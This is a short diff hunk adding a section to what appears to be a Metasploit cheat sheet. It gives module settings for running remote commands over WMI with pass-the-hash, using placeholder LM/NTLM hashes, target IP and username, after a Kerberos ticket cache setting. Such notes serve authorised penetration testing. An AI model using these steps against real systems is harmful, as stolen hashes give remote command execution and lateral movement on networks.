@@ -16,3 +16,16 @@ Kerberos Auth
     set smb::krb5ccname /root/.msf4/loot/DATE_default_IP_mit-kerberos.cca_NUM.bin
     run
 
+### 2) WMIExec 
+
+    use auxiliary/scanner/smb/impacket/wmiexec
+
+Run commands via WMI Pass-the-Hash
+
+    set command ipconfig
+    set hashes LM_HASH:NTLM_HASH
+    set rhosts IP
+    set smbuser USER
+    run
+
+    
